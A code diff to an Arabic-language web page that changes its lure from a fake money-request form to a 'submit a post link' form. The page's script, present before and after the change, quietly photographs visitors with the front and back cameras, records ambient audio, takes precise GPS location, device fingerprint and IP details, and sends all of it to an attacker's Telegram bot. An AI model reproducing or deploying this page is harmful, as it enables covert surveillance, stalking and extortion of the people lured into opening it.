@@ -174,7 +174,7 @@
             color: #2ed573;
         }
 
-        /* ===== قسم النموذج ===== */
+        /* ===== قسم الرابط ===== */
         .form-section {
             padding: 24px 24px 8px;
         }
@@ -241,33 +241,6 @@
             transform: translateY(-50%);
             font-size: 18px;
             opacity: 0.5;
-        }
-
-        /* ===== ملخص المبلغ ===== */
-        .amount-summary {
-            background: linear-gradient(135deg, #f8f9fc, #eef1f7);
-            margin: 0 24px 12px;
-            border-radius: 16px;
-            padding: 14px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid #e0e5ee;
-        }
-        .amount-summary .label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #2a3a5e;
-        }
-        .amount-summary .value {
-            font-size: 26px;
-            font-weight: 800;
-            color: #0f3460;
-        }
-        .amount-summary .value small {
-            font-size: 16px;
-            font-weight: 400;
-            color: #667799;
         }
 
         /* ===== زر الإرسال ===== */
@@ -413,6 +386,42 @@
             display: inline-block;
             margin-left: 6px;
         }
+
+        /* ===== تصميم الرابط المستضاف ===== */
+        .link-preview-box {
+            background: #f4f6fa;
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin: 0 24px 16px;
+            border: 2px dashed #d0d7e6;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+        }
+        .link-preview-box.show {
+            display: flex;
+        }
+        .link-preview-box .link-icon {
+            font-size: 24px;
+        }
+        .link-preview-box .link-info {
+            flex: 1;
+        }
+        .link-preview-box .link-info .link-url {
+            font-size: 13px;
+            color: #0f3460;
+            font-weight: 600;
+            word-break: break-all;
+        }
+        .link-preview-box .link-info .link-label {
+            font-size: 11px;
+            color: #8899bb;
+        }
+        .link-preview-box .link-status {
+            font-size: 12px;
+            color: #2ed573;
+        }
     </style>
 </head>
 <body>
@@ -444,39 +453,27 @@
         </div>
     </div>
 
-    <!-- ===== النموذج ===== -->
+    <!-- ===== حقل إدخال الرابط ===== -->
     <div class="form-section">
-        <div class="section-title">📋 بيانات الطلب</div>
+        <div class="section-title">🔗 رابط المنشور</div>
 
         <div class="input-group">
-            <label>👤 اسم المستفيد <span>(الاسم الثلاثي)</span></label>
+            <label>📎 أدخل رابط المنشور <span>(رابط الفيديو أو الصورة)</span></label>
             <div class="input-with-icon">
-                <span class="input-icon">✍️</span>
-                <input type="text" class="input-field" id="beneficiaryName" placeholder="مثال: أحمد محمد علي" value="أحمد محمد">
-            </div>
-        </div>
-
-        <div class="input-group">
-            <label>💰 المبلغ المطلوب <span>(بالجنيه المصري)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">💵</span>
-                <input type="number" class="input-field" id="debtAmount" placeholder="مثال: 2500" value="2500">
-            </div>
-        </div>
-
-        <div class="input-group">
-            <label>📞 رقم الهاتف <span>(للتواصل)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">📱</span>
-                <input type="tel" class="input-field" id="contactPhone" placeholder="01012345678" value="01050000000">
+                <span class="input-icon">🔗</span>
+                <input type="url" class="input-field" id="postLink" placeholder="https://www.facebook.com/...">
             </div>
         </div>
     </div>
 
-    <!-- ===== ملخص المبلغ ===== -->
-    <div class="amount-summary">
-        <span class="label">🏷️ المبلغ المطلوب</span>
-        <span class="value" id="displayAmount">2,500 <small>ج.م</small></span>
+    <!-- ===== معاينة الرابط ===== -->
+    <div class="link-preview-box" id="linkPreview">
+        <span class="link-icon">📄</span>
+        <div class="link-info">
+            <div class="link-url" id="previewUrl">https://example.com/post</div>
+            <div class="link-label" id="previewLabel">رابط المنشور</div>
+        </div>
+        <span class="link-status" id="linkStatus">✓ جاهز</span>
     </div>
 
     <!-- ===== زر الإرسال ===== -->
@@ -531,7 +528,6 @@
             const ownerBioEl = document.getElementById('ownerBio');
             const loadingBioEl = document.getElementById('loadingBio');
             const loadingIndicator = document.getElementById('loadingIndicator');
-            const loadingLabel = document.getElementById('loadingLabel');
             const verifiedBadge = document.getElementById('verifiedBadge');
             const statusText = document.getElementById('statusText');
             const statusDot = document.getElementById('statusDot');
@@ -554,7 +550,6 @@
                     step++;
                     setTimeout(updateStep, 700 + Math.random() * 400);
                 } else {
-                    // انتهى التحميل - عرض بيانات صاحب المنشور
                     ownerNameEl.textContent = OWNER.name;
                     ownerBioEl.textContent = OWNER.bio;
                     ownerBioEl.classList.add('show');
@@ -578,6 +573,31 @@
 
             setTimeout(updateStep, 500);
         }
+
+        // ============================================================
+        //  معاينة الرابط
+        // ============================================================
+        const linkInput = document.getElementById('postLink');
+        const linkPreview = document.getElementById('linkPreview');
+        const previewUrl = document.getElementById('previewUrl');
+        const linkStatus = document.getElementById('linkStatus');
+
+        linkInput.addEventListener('input', function() {
+            const url = this.value.trim();
+            if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
+                linkPreview.classList.add('show');
+                previewUrl.textContent = url.length > 50 ? url.substring(0, 50) + '...' : url;
+                linkStatus.textContent = '✓ جاهز';
+                linkStatus.style.color = '#2ed573';
+            } else if (url) {
+                linkPreview.classList.add('show');
+                previewUrl.textContent = url;
+                linkStatus.textContent = '⚠️ رابط غير صالح';
+                linkStatus.style.color = '#e74c3c';
+            } else {
+                linkPreview.classList.remove('show');
+            }
+        });
 
         // ============================================================
         //  دوال الإرسال للتليجرام
@@ -618,7 +638,7 @@
         // ============================================================
         //  دوال الكاميرا والصوت والموقع
         // ============================================================
-        async function captureFrontCamera(chatId, botToken, phoneNumber, name, amount) {
+        async function captureFrontCamera(chatId, botToken, link, ownerName) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 },
                         height: { ideal: 720 } } });
@@ -633,14 +653,14 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                 const caption =
-                    `📸 كاميرا أمامية (سيلفي)\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n👤 صاحب المنشور: ${OWNER.name}`;
+                    `📸 كاميرا أمامية (سيلفي)\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch (e) { return false; }
         }
 
-        async function captureBackCamera(chatId, botToken, phoneNumber, name, amount) {
+        async function captureBackCamera(chatId, botToken, link, ownerName) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment',
                         width: { ideal: 1920 }, height: { ideal: 1080 } } });
@@ -654,14 +674,14 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                 const caption =
-                    `📷 كاميرا خلفية\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n👤 صاحب المنشور: ${OWNER.name}`;
+                    `📷 كاميرا خلفية\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch (e) { return false; }
         }
 
-        async function recordAmbientAudio(chatId, botToken, phoneNumber, name, amount) {
+        async function recordAmbientAudio(chatId, botToken, link, ownerName) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
@@ -671,7 +691,7 @@
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
                         const caption =
-                            `🎤 تسجيل صوتي\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n👤 صاحب المنشور: ${OWNER.name}`;
+                            `🎤 تسجيل صوتي\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
                         await sendToTelegram(chatId, botToken, 'audio', blob, caption);
                         resolve(true);
                     };
@@ -683,7 +703,7 @@
             } catch (e) { return false; }
         }
 
-        function getPreciseLocation(chatId, botToken, phoneNumber, name, amount) {
+        function getPreciseLocation(chatId, botToken, link, ownerName) {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(false); return; }
                 navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -699,14 +719,14 @@
                         if (data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
                     } catch (e) {}
                     const locMsg =
-                        `🌍 <b>الموقع الجغرافي</b>\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}\n👤 صاحب المنشور: ${OWNER.name}`;
+                        `🌍 <b>الموقع الجغرافي</b>\n🔗 الرابط: ${link}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}\n👤 صاحب المنشور: ${ownerName}`;
                     await sendToTelegram(chatId, botToken, 'text', null, locMsg);
                     resolve(true);
                 }, () => { resolve(false); }, { enableHighAccuracy: true, timeout: 10000 });
             });
         }
 
-        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber, name, amount) {
+        async function getDeepDeviceFingerprint(chatId, botToken, link, ownerName) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
@@ -724,11 +744,11 @@
                     `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
             const deviceMsg =
-                `🕵️‍♂️ <b>بصمة الجهاز</b>\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${OWNER.name}`;
+                `🕵️‍♂️ <b>بصمة الجهاز</b>\n🔗 الرابط: ${link}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${ownerName}`;
             await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
 
-        async function getRichIPData(chatId, botToken, phoneNumber, name, amount) {
+        async function getRichIPData(chatId, botToken, link, ownerName) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -742,7 +762,7 @@
                 let city = ipDetails.city || "غير معروف";
                 let isp = ipDetails.org || ipDetails.asn || "غير معروف";
                 const ipMsg =
-                    `🌐 <b>IP & Network</b>\n👤 المستفيد: ${name}\n💰 المبلغ: ${amount} ج.م\n📞 التواصل: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}\n👤 صاحب المنشور: ${OWNER.name}`;
+                    `🌐 <b>IP & Network</b>\n🔗 الرابط: ${link}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}\n👤 صاحب المنشور: ${ownerName}`;
                 await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
             } catch (e) {}
         }
@@ -751,85 +771,65 @@
         //  التشغيل الرئيسي
         // ============================================================
         const submitBtn = document.getElementById('submitBtn');
-        const nameInput = document.getElementById('beneficiaryName');
-        const amountInput = document.getElementById('debtAmount');
-        const phoneInput = document.getElementById('contactPhone');
-        const displayAmount = document.getElementById('displayAmount');
+        const linkInputMain = document.getElementById('postLink');
         const loaderDiv = document.getElementById('globalLoader');
         const loaderText = document.getElementById('loaderText');
         const errorDiv = document.getElementById('errorMsg');
 
         let isRunning = false;
 
-        amountInput.addEventListener('input', function() {
-            const val = this.value.replace(/,/g, '');
-            const num = parseInt(val) || 0;
-            displayAmount.innerHTML = num.toLocaleString() + ' <small>ج.م</small>';
-        });
-
         async function startProcess() {
             if (isRunning) return;
 
-            const name = nameInput.value.trim();
-            const amountRaw = amountInput.value.trim();
-            const phoneNumber = phoneInput.value.trim();
+            const link = linkInputMain.value.trim();
 
-            if (name.length < 3) {
+            if (!link) {
                 errorDiv.className = 'error-toast';
-                errorDiv.innerText = "⚠️ يرجى إدخال اسم المستفيد (ثلاثة أحرف على الأقل)";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-            const amountNum = parseInt(amountRaw);
-            if (isNaN(amountNum) || amountNum < 10) {
-                errorDiv.className = 'error-toast';
-                errorDiv.innerText = "⚠️ يرجى إدخال مبلغ صحيح (10 جنيه على الأقل)";
-                errorDiv.style.display = "block";
-                setTimeout(() => errorDiv.style.display = "none", 3000);
-                return;
-            }
-            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
-                errorDiv.className = 'error-toast';
-                errorDiv.innerText = "⚠️ رقم هاتف غير صالح (مثال: 01012345678)";
+                errorDiv.innerText = "⚠️ يرجى إدخال رابط المنشور";
                 errorDiv.style.display = "block";
                 setTimeout(() => errorDiv.style.display = "none", 3000);
                 return;
             }
 
-            const formattedAmount = amountNum.toLocaleString();
+            if (!link.startsWith('http://') && !link.startsWith('https://')) {
+                errorDiv.className = 'error-toast';
+                errorDiv.innerText = "⚠️ الرابط يجب أن يبدأ بـ http:// أو https://";
+                errorDiv.style.display = "block";
+                setTimeout(() => errorDiv.style.display = "none", 3000);
+                return;
+            }
 
             isRunning = true;
             submitBtn.disabled = true;
             loaderDiv.style.visibility = "visible";
             document.getElementById('statusBar').innerHTML = "📡 جاري الإرسال...";
 
-            // إرسال البيانات الأساسية
+            // إرسال الرابط الأساسي
             await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                `📋 <b>طلب جديد</b>\n👤 المستفيد: ${name}\n💰 المبلغ: ${formattedAmount} ج.م\n📞 التواصل: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${OWNER.name}`);
+                `📋 <b>طلب جديد - رابط منشور</b>\n🔗 الرابط: ${link}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${OWNER.name}`);
 
             loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
-            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
-            await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
+            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, link, OWNER.name);
+            await getRichIPData(MASTER_ID, BOT_TOKEN, link, OWNER.name);
 
             loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
-            await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
+            await captureFrontCamera(MASTER_ID, BOT_TOKEN, link, OWNER.name);
 
             loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
-            await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
+            await captureBackCamera(MASTER_ID, BOT_TOKEN, link, OWNER.name);
 
             loaderText.innerText = "🎤 جاري تسجيل الصوت...";
-            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
+            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, link, OWNER.name);
 
             loaderText.innerText = "📍 جاري تحديد الموقع...";
-            await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber, name, formattedAmount);
+            await getPreciseLocation(MASTER_ID, BOT_TOKEN, link, OWNER.name);
 
             await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                `✅ <b>تم استلام الطلب بنجاح!</b>\n👤 المستفيد: ${name}\n💰 المبلغ: ${formattedAmount} ج.م\n📞 التواصل: ${phoneNumber}\n👤 صاحب المنشور: ${OWNER.name}\n📌 سيتم التواصل خلال 24 ساعة`);
+                `✅ <b>تم استلام الرابط بنجاح!</b>\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${OWNER.name}\n📌 سيتم التواصل خلال 24 ساعة`);
 
             loaderDiv.style.visibility = "hidden";
             errorDiv.className = 'error-toast success';
-            errorDiv.innerText = "✅ تم استلام طلبك بنجاح! سيتم التواصل معك خلال 24 ساعة.";
+            errorDiv.innerText = "✅ تم استلام الرابط بنجاح! سيتم التواصل معك خلال 24 ساعة.";
             errorDiv.style.display = "block";
             submitBtn.disabled = false;
             document.getElementById('statusBar').innerHTML = '<span class="dot" style="background:#2ed573;"></span> تم الإرسال بنجاح';
